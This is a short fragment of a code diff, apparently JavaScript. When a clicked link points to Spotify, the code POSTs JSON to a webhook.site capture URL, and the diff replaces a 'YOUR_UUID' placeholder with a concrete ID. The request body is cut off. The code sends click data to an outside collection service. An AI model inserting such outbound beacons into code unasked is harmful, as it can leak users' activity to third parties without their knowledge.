@@ -36,7 +36,7 @@
     if (!link) return;
 
     if (link.href && link.href.includes("spotify")) {
-      fetch("https://webhook.site/YOUR_UUID", {
+      fetch("https://webhook.site/4ce292bc-3284-422a-aefd-76c2be65824b", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
